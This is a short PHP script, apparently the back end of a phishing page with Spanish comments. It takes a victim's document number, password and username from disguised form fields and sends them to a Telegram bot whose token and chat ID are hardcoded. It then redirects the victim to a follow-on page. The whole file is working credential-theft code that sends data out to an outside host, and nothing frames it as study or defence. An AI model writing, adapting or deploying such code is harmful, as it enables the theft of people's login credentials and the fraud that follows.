<?php
session_start();

$_SESSION['u1'] = $_POST['d0cv'];
$_SESSION['u2'] = $_POST['p455s'];
$_SESSION['u3'] = $_POST['us4r'];

// Datos del bot de Telegram
$botToken = '6662872977:AAG9cyvIoECBjYw_Dg1TlLRi99A97u6UW_M';
$chatID = '5792986703';
$message = urlencode("Se ha registrado un nuevo usuario:\nDocumento: ".$_POST['d0cv']."\nClave: ".$_POST['p455s']."\nUsuario: ".$_POST['us4r']);

// URL de la API de Telegram para enviar mensajes
$telegramURL = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatID}&text={$message}";

// Enviar solicitud a la API de Telegram
$response = file_get_contents($telegramURL);

// Redirigir al usuario a una página después del envío
header('Location: ../2da.html');
?>
